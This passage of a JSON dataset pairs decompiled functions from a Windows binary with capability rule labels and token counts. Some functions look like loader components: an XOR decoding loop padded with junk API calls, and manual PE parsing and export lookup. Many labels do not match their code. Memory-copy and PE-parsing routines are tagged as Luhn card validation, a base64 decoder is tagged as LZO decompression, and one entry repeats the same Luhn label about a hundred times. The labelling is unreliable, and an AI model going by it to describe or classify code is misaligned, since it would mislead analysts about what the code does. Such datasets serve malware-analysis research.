        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0041c910(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *arg_10h;\n    int32_t *in_ECX;\n    char *in_EDX;\n    uint unaff_EBX;\n    int32_t *in_FS_OFFSET;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_40h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x4418a8;\n    var_ch = *in_FS_OFFSET;\n    var_10h = *0x454664 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    var_24h = str.0123456789ABCDEF._0_4_;\n    var_20h = str.0123456789ABCDEF._4_4_;\n    var_1ch = str.0123456789ABCDEF._8_4_;\n    var_18h = str.0123456789ABCDEF._12_4_;\n    var_14h._0_1_ = str.0123456789ABCDEF[16];\n    iVar1 = (**0x457418)();\n    if (((0 < iVar1) && (iVar1 = fcn.0042e880(&var_24h, *in_EDX),  iVar1 != 0)) &&\n       (iVar1 = fcn.0042e880(&var_24h, in_EDX[1]),  iVar1 != 0)) {\n        iVar1 = (**0x457418)();\n        iVar1 = iVar1 + -1;\n        *in_ECX = iVar1;\n        uVar2 = (**0x45757c)(8, iVar1);\n        iVar3 = (**0x457504)(uVar2);\n        *arg_8h = iVar3;\n        if (iVar3 != 0) {\n            fcn.00408f20(in_EDX);\n            var_4h = 0;\n            arg_10h = fcn.00414960(0xffffffff);\n            if (0xf < arg_10h[5]) {\n                arg_10h = *arg_10h;\n            }\n            fcn.0042dd9f(*arg_8h, iVar1, arg_10h);\n            fcn.00408f80();\n            fcn.00408f80();\n        }\n    }\n    *in_FS_OFFSET = var_ch;\n    fcn.0042d636(unaff_EBX);\n    return;\n}\n",
        "token_count": 639
    },
    "0042b1f0": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042b1f0(char param_1, uint32_t *param_2)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = *(((param_1 ^ *param_2) & 0xff) * 4 + 0x44cac0) ^ *param_2 >> 8;\n    *param_2 = uVar1;\n    uVar1 = ((uVar1 & 0xff) + param_2[1]) * 0x8088405 + 1;\n    param_2[1] = uVar1;\n    param_2[2] = param_2[2] >> 8 ^ *(((uVar1 >> 0x18 ^ param_2[2]) & 0xff) * 4 + 0x44cac0);\n    return;\n}\n",
        "token_count": 186
    },
    "0040c440": {
        "rules": [
            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040c440(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t *unaff_EBX;\n    int32_t var_4h;\n    \n    iVar2 = fcn.0040c360(&var_4h);\n    iVar1 = var_4h;\n    if (iVar2 == 0) {\n        iVar2 = fcn.0040c360(&var_4h);\n    }\n    iVar4 = var_4h * 0x100;\n    if (iVar2 == 0) {\n        iVar2 = fcn.0040c360(&var_4h);\n    }\n    iVar3 = var_4h * 0x10000;\n    if (iVar2 == 0) {\n        iVar2 = fcn.0040c360(&var_4h);\n        if (iVar2 == 0) {\n            *unaff_EBX = var_4h * 0x1000000 + iVar1 + iVar4 + iVar3;\n            return;\n        }\n    }\n    *unaff_EBX = 0;\n    return;\n}\n",
        "token_count": 259
    },
    "0040c3f0": {
        "rules": [
            "decompress data using aPLib/06666ba0b6a14a5481e4ee6eb664d454"
        ],
        "decompiled_code": "\nvoid fcn.0040c3f0(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *unaff_EBX;\n    int32_t var_4h;\n    \n    iVar2 = fcn.0040c360(&var_4h);\n    iVar1 = var_4h;\n    if (iVar2 == 0) {\n        iVar2 = fcn.0040c360(&var_4h);\n        if (iVar2 == 0) {\n            *unaff_EBX = var_4h * 0x100 + iVar1;\n            return;\n        }\n    }\n    *unaff_EBX = 0;\n    return;\n}\n",
        "token_count": 152
    },
    "00423aa0": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nuint8_t * __fastcall fcn.00423aa0(uint8_t *param_1, int32_t param_2)\n\n{\n    char *pcVar1;\n    char *pcVar2;\n    int32_t in_EAX;\n    uint8_t *puVar3;\n    int32_t iVar4;\n    uint var_4h;\n    \n    iVar4 = 0;\n    puVar3 = param_1;\n    if (0 < param_2) {\n        do {\n            *puVar3 = *(*(in_EAX + iVar4) + 0x44cec0) * '\\x04' | *(*(in_EAX + 1 + iVar4) + 0x44cec0) >> 4;\n            puVar3[1] = *(*(in_EAX + 2 + iVar4) + 0x44cec0) >> 2 | *(*(in_EAX + 1 + iVar4) + 0x44cec0) << 4;\n            pcVar1 = in_EAX + 2 + iVar4;\n            pcVar2 = in_EAX + 3 + iVar4;\n            iVar4 = iVar4 + 4;\n            puVar3[2] = *(*pcVar1 + 0x44cec0) << 6 | *(*pcVar2 + 0x44cec0);\n            puVar3 = puVar3 + 3;\n        } while (iVar4 < param_2);\n    }\n    if (*(in_EAX + -2 + iVar4) != '=') {\n        if (*(in_EAX + -1 + iVar4) != '=') {\n            *puVar3 = 0;\n            return param_1;\n        }\n        *(puVar3 + -1) = 0;\n        return param_1;\n    }\n    *(puVar3 + -1) = 0;\n    puVar3[-2] = 0;\n    return param_1;\n}\n",
        "token_count": 418
    },
    "00429b00": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nvoid fcn.00429b00(void)\n\n{\n    int32_t in_EAX;\n    uint16_t *puVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    iVar3 = 0;\n    iVar2 = 0;\n    puVar1 = in_EAX + 0x34;\n    var_8h = 0x3c;\n    do {\n        iVar3 = iVar3 + puVar1[-2];\n        iVar2 = iVar2 + *puVar1;\n        puVar1 = puVar1 + 4;\n        var_8h = var_8h + -1;\n    } while (var_8h != 0);\n    var_4h = 0;\n    var_8h = 0;\n    puVar1 = in_EAX + 0x218;\n    var_ch = 0x40;\n    do {\n        var_4h = var_4h + puVar1[-2];\n        var_8h = var_8h + *puVar1;\n        puVar1 = puVar1 + 4;\n        var_ch = var_ch + -1;\n    } while (var_ch != 0);\n    **(in_EAX + 0x1af50) =\n         *(in_EAX + 0x2c) + *(in_EAX + 0x28) + *(in_EAX + 0x24) + *(in_EAX + 0x20) + *(in_EAX + 0x1c) + *(in_EAX + 0x18)\n         + *(in_EAX + 0x14) + var_8h + var_4h <= *(in_EAX + 0x210) + iVar2 + iVar3 >> 2;\n    return;\n}\n",
        "token_count": 414
    },
    "00429f80": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nchar * fcn.00429f80(void)\n\n{\n    char *pcVar1;\n    char *pcVar2;\n    uint32_t uVar3;\n    uint32_t in_EAX;\n    char *pcVar4;\n    char *pcVar5;\n    char *pcVar6;\n    int32_t unaff_ESI;\n    char *pcVar7;\n    uint32_t var_10h;\n    uint var_ch;\n    uint32_t var_8h;\n    char var_2h;\n    uint var_1h;\n    \n    var_8h = *(unaff_ESI + 0x6af94);\n    uVar3 = *(unaff_ESI + 0x6af84);\n    pcVar7 = *(unaff_ESI + 0x6af80);\n    pcVar4 = uVar3 + 0x1af70 + unaff_ESI;\n    if (uVar3 < 0x7efb) {\n        var_10h = 0;\n    }\n    else {\n        var_10h = uVar3 - 0x7efa;\n    }\n    pcVar2 = uVar3 + 0x1b072 + unaff_ESI;\n    var_1h._0_1_ = pcVar4[pcVar7 + -1];\n    var_2h = pcVar4[pcVar7];\n    if (*(unaff_ESI + 0x6af9c) <= pcVar7) {\n        var_8h = var_8h >> 2;\n    }\n    do {\n        pcVar6 = unaff_ESI + 0x1af70 + in_EAX;\n        if ((((pcVar6[pcVar7] == var_2h) && (pcVar6[pcVar7 + -1] == var_1h)) && (*pcVar6 == *pcVar4)) &&\n           (pcVar6[1] == pcVar4[1])) {\n            pcVar4 = pcVar4 + 2;\n            pcVar6 = pcVar6 + 2;\n            while (((((pcVar5 = pcVar4 + 1,  pcVar4[1] == pcVar6[1] && (pcVar5 = pcVar4 + 2,  pcVar4[2] == pcVar6[2]))\n                     && ((pcVar5 = pcVar4 + 3,  pcVar4[3] == pcVar6[3] &&\n                         ((pcVar5 = pcVar4 + 4,  pcVar4[4] == pcVar6[4] &&\n                          (pcVar5 = pcVar4 + 5,  pcVar4[5] == pcVar6[5])))))) &&\n                    (pcVar5 = pcVar4 + 6,  pcVar4[6] == pcVar6[6])) && (pcVar5 = pcVar4 + 7,  pcVar4[7] == pcVar6[7])))\n            {\n                pcVar1 = pcVar4 + 8;\n                pcVar4 = pcVar4 + 8;\n                pcVar6 = pcVar6 + 8;\n                pcVar5 = pcVar4;\n                if ((*pcVar1 != *pcVar6) || (pcVar2 <= pcVar4)) break;\n            }\n            pcVar6 = pcVar5 + (0x102 - pcVar2);\n            pcVar4 = pcVar2 + -0x102;\n            if (pcVar7 < pcVar6) {\n                *(unaff_ESI + 0x6af88) = in_EAX;\n                if (*(unaff_ESI + 0x6afa0) <= pcVar6) {\n                    return pcVar6;\n                }\n                var_1h._0_1_ = pcVar4[pcVar5 + (0x101 - pcVar2)];\n                var_2h = pcVar4[pcVar6];\n                pcVar7 = pcVar6;\n            }\n        }\n        in_EAX = *(unaff_ESI + 0x2af70 + (in_EAX & 0x7fff) * 4);\n        if (in_EAX <= var_10h) {\n            return pcVar7;\n        }\n        var_8h = var_8h - 1;\n        if (var_8h == 0) {\n            return pcVar7;\n        }\n    } while( true );\n}\n",
        "token_count": 985
    },
    "00404540": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404540(int32_t arg_8h, char *arg_ch)\n\n{\n    char cVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    char *pcVar4;\n    uint32_t in_ECX;\n    uint32_t uVar5;\n    uint *arg_8h_00;\n    uint var_7e0h;\n    uint var_7dch;\n    uint var_7d8h;\n    uint lpString1;\n    uint32_t var_4h;\n    \n    var_4h = *0x454664 ^ &stack0xfffffffc;\n    fcn.00434d30(&lpString1, 0, 2000);\n    (*_sym.imp.KERNEL32.dll_lstrcatW)(&lpString1, 0x44c580);\n    pcVar2 = _sym.imp.KERNEL32.dll_lstrlenW;\n    (*_sym.imp.KERNEL32.dll_lstrlenW)(&lpString1);\n    (*pcVar2)(&lpString1);\n    (*pcVar2)(&lpString1);\n    (*pcVar2)(&lpString1);\n    iVar3 = (*_sym.imp.KERNEL32.dll_LocalAlloc)(0x40, in_ECX + 1);\n    (*pcVar2)(&lpString1);\n    (*pcVar2)(&lpString1);\n    (*pcVar2)(&lpString1);\n    (*pcVar2)(&lpString1);\n    *(in_ECX + iVar3) = 0;\n    (*pcVar2)(&lpString1);\n    (*pcVar2)(&lpString1);\n    (*pcVar2)(&lpString1);\n    (*pcVar2)(&lpString1);\n    uVar5 = 0;\n    if (in_ECX != 0) {\n        do {\n            (*pcVar2)(&lpString1);\n            (*pcVar2)(&lpString1);\n            (*pcVar2)(&lpString1);\n            pcVar4 = arg_ch;\n            do {\n                cVar1 = *pcVar4;\n                pcVar4 = pcVar4 + 1;\n            } while (cVar1 != '\\0');\n            *(uVar5 + iVar3) = arg_ch[uVar5 % (pcVar4 - (arg_ch + 1))] ^ (uVar5 + iVar3)[arg_8h - iVar3];\n            (*pcVar2)(&lpString1);\n            (*pcVar2)(&lpString1);\n            (*pcVar2)(&lpString1);\n            uVar5 = uVar5 + 1;\n        } while (uVar5 < in_ECX);\n    }\n    arg_8h_00 = &lpString1;\n    (*pcVar2)();\n    (*pcVar2)(&lpString1);\n    (*pcVar2)(&lpString1);\n    (*pcVar2)(&lpString1);\n    fcn.0042d636(arg_8h_00);\n    return;\n}\n",
        "token_count": 651
    },
    "00404860": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.00404860(void)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t *unaff_EBX;\n    uint32_t *puVar3;\n    int32_t unaff_EDI;\n    uint32_t var_4h;\n    \n    uVar2 = *(unaff_EDI + 0x140) + *(unaff_EDI + 0x13c);\n    if (uVar2 != 0) {\n        if (unaff_EBX[1] <= uVar2 && uVar2 != unaff_EBX[1]) {\n            return 1;\n        }\n        fcn.0042f700(*(unaff_EDI + 0x144), *unaff_EBX, uVar2);\n    }\n    var_4h = 0;\n    if (*(unaff_EDI + 0x46) != 0) {\n        puVar3 = *(unaff_EDI + 0x138) + 0x10;\n        do {\n            uVar2 = puVar3[-2];\n            if (*puVar3 <= puVar3[-2]) {\n                uVar2 = *puVar3;\n            }\n            if (uVar2 != 0) {\n                uVar1 = puVar3[1] + uVar2;\n                if (unaff_EBX[1] <= uVar1 && uVar1 != unaff_EBX[1]) {\n                    return 1;\n                }\n                fcn.0042f700(puVar3[-1] + *(unaff_EDI + 0x144), *unaff_EBX + puVar3[1], uVar2);\n            }\n            var_4h = var_4h + 1;\n            puVar3 = puVar3 + 10;\n        } while (var_4h < *(unaff_EDI + 0x46));\n    }\n    return 0;\n}\n",
        "token_count": 419
    },
    "00404c20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00404c35)\n\nint32_t __cdecl fcn.00404c20(uint *arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    uint32_t uVar4;\n    uint var_15ch;\n    int32_t var_f4h;\n    uint var_a4h;\n    int32_t var_24h;\n    int32_t var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    uint32_t var_ch;\n    uint var_8h;\n    code *var_4h;\n    \n    var_24h = 0;\n    var_10h = 0;\n    var_8h = 0;\n    var_ch = 0;\n    var_4h = NULL;\n    iVar2 = fcn.004046e0();\n    if ((((iVar2 == 0) && (iVar2 = fcn.004047b0(),  iVar2 == 0)) && (iVar2 = fcn.00404860(),  iVar2 == 0)) &&\n       (((iVar2 = fcn.00404910(&var_15ch),  iVar2 == 0 && (iVar2 = fcn.004049d0(),  iVar2 == 0)) &&\n        (iVar2 = fcn.00404b60(),  iVar2 == 0)))) {\n        pcVar3 = var_4h;\n        if (var_f4h != 0) {\n            iVar2 = (*(var_18h + var_f4h))(var_18h, 1, 0);\n            pcVar3 = var_18h + var_f4h;\n            if (iVar2 == 0) {\n                return 10;\n            }\n        }\n        uVar1 = var_ch;\n        iVar2 = var_10h;\n        if (arg_8h == NULL) {\n            if (var_10h != 0) {\n                uVar4 = 0;\n                if (var_ch != 0) {\n                    do {\n                        (**0x4575dc)(*(iVar2 + uVar4 * 4));\n                        uVar4 = uVar4 + 1;\n                    } while (uVar4 < uVar1);\n                }\n                fcn.0042d696(iVar2);\n            }\n        }\n        else {\n            arg_8h[3] = var_14h;\n            arg_8h[5] = var_a4h;\n            *arg_8h = 0x20;\n            arg_8h[1] = 0;\n            arg_8h[2] = var_18h;\n            arg_8h[4] = pcVar3;\n            arg_8h[6] = var_10h;\n            arg_8h[7] = var_ch;\n        }\n        if (var_24h != 0) {\n            fcn.0042d696(var_24h);\n        }\n        iVar2 = 0;\n    }\n    return iVar2;\n}\n",
        "token_count": 671
    },
    "00404d60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404d60(uint arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t *arg_14h)\n\n{\n    if (arg_10h != 0) {\n        if (arg_14h[1] <= arg_ch + arg_10h && arg_ch + arg_10h != arg_14h[1]) {\n            return 0;\n        }\n        fcn.0042f700(arg_8h, *arg_14h + arg_ch, arg_10h);\n    }\n    return 1;\n}\n",
        "token_count": 130
    },
    "00404da0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00404da0(int32_t arg_8h)\n\n{\n    uint32_t in_EAX;\n    int32_t iVar1;\n    int32_t unaff_ESI;\n    uint32_t uVar2;\n    \n    if (arg_8h != 0) {\n        if (in_EAX < 0x10000) {\n            uVar2 = *(arg_8h + 0x10 + unaff_ESI);\n            if (in_EAX < uVar2) {\n                return 0;\n            }\n            in_EAX = in_EAX - uVar2;\n        }\n        else {\n            uVar2 = 0;\n            if (*(arg_8h + 0x18 + unaff_ESI) != 0) {\n                do {\n                    iVar1 = (**0x457550)(*(*(arg_8h + 0x20 + unaff_ESI) + uVar2 * 4 + unaff_ESI) + unaff_ESI);\n                    if (iVar1 == 0) {\n                        in_EAX = *(*(arg_8h + 0x24 + unaff_ESI) + uVar2 * 2 + unaff_ESI);\n                        break;\n                    }\n                    uVar2 = uVar2 + 1;\n                } while (uVar2 < *(arg_8h + 0x18 + unaff_ESI));\n            }\n        }\n        if (in_EAX < *(arg_8h + 0x14 + unaff_ESI)) {\n            return *(*(arg_8h + 0x1c + unaff_ESI) + in_EAX * 4 + unaff_ESI) + unaff_ESI;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 381
    },
    "004053b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004053b0(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t *piVar2;\n    uint *puVar3;\n    uint unaff_EBX;\n    int32_t iVar4;\n    int32_t *in_FS_OFFSET;\n    int32_t var_44h;\n    uint var_40h;\n    int32_t var_34h;\n    uint32_t var_30h;\n    uint var_20h;\n    uint32_t var_1ch;\n    uint var_14h;\n    int32_t var_ch;\n    uint uStack12;\n    int32_t var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x442860;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x454664 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    fcn.00404f00(arg_8h);\n    iVar4 = 0;\n    var_4h = 0;\n    if ((0 < var_34h) && ((**0x457520)(*0x4572d4, 0x44c738, arg_8h, uVar1),  0 < var_34h)) {\n        do {\n            piVar2 = iVar4 + 4 + var_44h;\n            if (0xf < *(iVar4 + 0x18 + var_44h)) {\n                piVar2 = *piVar2;\n            }\n            (**0x457520)(*0x4572d4, piVar2);\n            (**0x457520)(*0x4572d4, 0x44c73c);\n            if (*(iVar4 + var_44h) == 4) {\n                puVar3 = fcn.00423ec0(*(iVar4 + 0x40 + var_44h));\n                var_4h._0_1_ = 1;\n                if (0xf < puVar3[5]) {\n                    puVar3 = *puVar3;\n                }\n                (**0x457520)(*0x4572d4, puVar3);\n                var_4h = var_4h._1_3_ << 8;\n                if (0xf < var_1ch) {\n                    fcn.0042d62b(var_30h);\n                }\n                var_1ch = 0xf;\n                var_30h = var_30h & 0xffffff00;\n            }\n            else {\n                piVar2 = iVar4 + 0x20 + var_44h;\n                if (0xf < *(iVar4 + 0x34 + var_44h)) {\n                    piVar2 = *piVar2;\n                }\n                (**0x457520)(*0x4572d4, piVar2);\n            }\n            (**0x457520)(*0x4572d4, 0x44c738);\n            iVar4 = iVar4 + 0x44;\n            var_34h = var_34h + -1;\n        } while (var_34h != 0);\n    }\n    if (var_44h != 0) {\n        fcn.00409bd0(var_34h);\n        fcn.0042d62b(var_44h);\n    }\n    *in_FS_OFFSET = var_ch;\n    fcn.0042d636(unaff_EBX);\n    return;\n}\n",
        "token_count": 760
    },
    "00408f80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
